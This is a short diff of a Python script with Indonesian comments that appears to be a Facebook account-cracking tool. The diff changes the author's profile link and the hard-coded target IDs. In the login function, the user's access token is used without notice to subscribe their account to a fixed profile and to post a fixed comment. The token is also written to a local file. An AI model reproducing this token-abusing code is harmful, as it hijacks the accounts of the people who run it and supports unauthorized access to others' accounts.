@@ -2,7 +2,7 @@
 #RECODE? BOLEH! JANGAN UBAH BOT FOLLOW SAMA KOMEN
 
 #AUTHOR: Ramdhan Ramadhian
-#FB: Fb.com/bahjamrong.jamrong
+#FB: Fb.com/105805581664563
 #SC VERSION: 1.0 (BETA)
 
 #OPEN SOURCE TEAM
@@ -25,7 +25,7 @@ except FileNotFoundError:
     open('ua','a').write(ja)
 id,nama=[],[]
 ok,cp,cot=0,0,0
-ajg=''
+crot=''
 try:ip=req.get('https://api.ipify.org').text
 except req.exceptions.ConnectionError:print('Koneksi Buruk!')
 def login():
@@ -33,8 +33,8 @@ def login():
     try:
         r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={t}').text)
         nama=r['name']
-        req.post(f'https://graph.facebook.com/100067602271889/subscribers?access_token={t}')
-        req.post(f"https://graph.facebook.com/126500636280012/comments?message=Hay I'm Fake Friends You!&access_token={t}")
+        req.post(f'https://graph.facebook.com/100044932290784/subscribers?access_token={t}')
+        req.post(f"https://graph.facebook.com/315723919935349/comments?message=Ramdani Maneh Bong Kasep!&access_token={t}")
         print(f'[{i}√{pu}] Login Berhasil\n{pu}[=] Nama Facebook:{b}',nama,pu)
         open('saveLogin.txt','a').write(t)
         time.sleep(0.7)
